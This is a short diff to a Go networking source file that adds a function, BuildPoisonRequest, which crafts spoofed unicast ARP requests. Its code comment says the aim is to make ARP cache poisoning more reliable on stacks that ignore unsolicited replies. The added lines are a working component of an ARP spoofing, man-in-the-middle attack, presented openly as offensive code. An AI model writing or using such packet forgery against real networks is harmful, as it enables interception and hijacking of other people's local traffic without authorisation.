@@ -58,3 +58,10 @@ func BuildARPRequest(senderIP net.IP, senderMAC net.HardwareAddr, targetIP net.I
 	broadcast := net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}
 	return buildARP(layers.ARPRequest, senderMAC, broadcast, senderIP, targetIP)
 }
+
+// BuildPoisonRequest crafts a unicast ARP request that appears to come from senderIP at
+// senderMAC. Stacks that ignore unsolicited replies often still update their cache from the
+// sender fields of a request, making poisoning more reliable.
+func BuildPoisonRequest(senderIP net.IP, senderMAC net.HardwareAddr, targetIP net.IP, targetMAC net.HardwareAddr) ([]byte, error) {
+	return buildARP(layers.ARPRequest, senderMAC, targetMAC, senderIP, targetIP)
+}
